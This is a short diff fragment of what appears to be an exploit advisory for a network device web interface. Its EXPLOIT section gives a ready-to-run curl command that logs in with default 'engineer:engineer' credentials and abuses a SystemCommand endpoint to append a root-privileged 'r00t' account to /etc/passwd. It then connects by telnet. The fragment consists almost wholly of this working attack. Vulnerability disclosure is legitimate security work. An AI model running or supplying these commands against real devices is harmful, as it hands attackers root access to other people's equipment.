@@ -33,7 +33,7 @@ THE PROBLEM
 EXPLOIT
      1) Remote add r00t user with password boza
           $curl --basic -u "engineer:engineer" \
-	        -d "command=echo -e \"r00t:CRYM.sLY1U1AI:0:0:Adminstrator:/:/bin/sh\" >> /etc/passwd;&SystemCommandSubmit=Apply" \
+	        -d "command=echo \"r00t:CRYM.sLY1U1AI:0:0:Adminstrator:/:/bin/sh\" >> /etc/passwd;&SystemCommandSubmit=Apply" \
 	        192.168.100.254/goform/SystemCommand
           $telnet 192.168.100.254
           Trying 192.168.100.254...
